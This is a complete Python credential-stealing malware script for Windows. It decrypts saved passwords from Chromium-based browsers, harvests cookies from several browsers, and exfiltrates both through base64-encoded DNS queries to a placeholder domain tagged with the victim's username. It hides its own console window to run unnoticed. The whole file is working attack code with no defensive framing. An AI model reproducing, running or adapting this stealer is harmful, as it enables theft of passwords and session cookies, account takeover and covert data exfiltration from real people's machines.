import os
import json
import base64
import ctypes
import asyncio
import requests
import sqlite3
import shutil
import win32crypt
import dns.resolver
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import browser_cookie3

# Convert Chrome's timestamp format to human-readable datetime
def _datetime_from_chrome_format(x):
    return datetime(1601, 1, 1) + timedelta(microseconds=x) if x != 86400000000 else ""

# Decrypt Windows DPAPI-encrypted key
def _decrypt_windows_key(encrypted_key):
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Extract AES encryption key from Local State file
def _extract_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return _decrypt_windows_key(encrypted_key)

# Decrypt Chrome/Chromium browser passwords
def _decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return _decrypt_windows_key(encrypted_password).decode()
        except:
            return ""

# Read and decrypt saved passwords from Chromium-based browsers
def _browser_credentials(browser_name, browser_path):
    credentials = []
    login_data_path = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(login_data_path): return credentials
    temp_db = "tmp_login.db"
    shutil.copyfile(login_data_path, temp_db)
    key = _extract_key(browser_path)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        for row in cursor.fetchall():
            credentials.append({
                "browser": browser_name,
                "url": row[0],
                "user": row[1],
                "pass": _decrypt_password(row[2], key),
                "created": _datetime_from_chrome_format(row[3])
            })
    except:
        pass
    cursor.close()
    conn.close()
    os.remove(temp_db)
    return credentials

# Extract credentials from all supported Chromium-based browsers
def _fetch_all_credentials():
    browsers = {
        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable")
    }
    return sum((_browser_credentials(name, path) for name, path in browsers.items() if os.path.exists(path)), [])

# Extract cookies from all browsers (except Firefox, due to NSS dependency)
def _fetch_cookies():
    all_cookies = []
    browsers = {
        "Chrome": browser_cookie3.chrome,
        "Firefox": browser_cookie3.firefox,
        "Edge": browser_cookie3.edge,
        "Opera": browser_cookie3.opera,
        "Brave": browser_cookie3.brave
    }
    for name, func in browsers.items():
        if name == "Firefox":  # Skipping Firefox due to NSS complications
            continue
        try:
            cookies = func(domain_name="")
            for cookie in cookies:
                all_cookies.append({
                    "browser": name,
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "expires": cookie.expires,
                    "secure": cookie.secure
                })
        except:
            pass
    return all_cookies

# Encrypt the data using AES before sending (optional obfuscation)
def _encrypt_data(data):
    return base64.b64encode(
        AES.new(b'0123456789abcdef', AES.MODE_GCM, b'0123456789ab').encrypt(json.dumps(data).encode())
    ).decode()

# Send data in small chunks through DNS requests
def _dns_send(data):
    encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
    chunks = [encoded_data[i:i+50] for i in range(0, len(encoded_data), 50)]
    for chunk in chunks:
        subdomain = f"{chunk}.yourdnsserver.com"
        try:
            dns.resolver.resolve(subdomain, "A")
        except:
            pass

# Send collected data under the current username
def _send(data):
    _dns_send({os.getlogin(): _encrypt_data(data)})

# Hide the console window and execute explorer to remain stealthy
def _inject():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    if not os.path.exists("C:\\Windows\\SysWOW64\\explorer.exe"): exit()
    os.system("C:\\Windows\\SysWOW64\\explorer.exe")

# Main coroutine for hidden execution
async def _main():
    _inject()
    _send(_fetch_all_credentials())  # Send credentials
    _send(_fetch_cookies())          # Send cookies

if __name__ == "__main__":
    asyncio.run(_main())
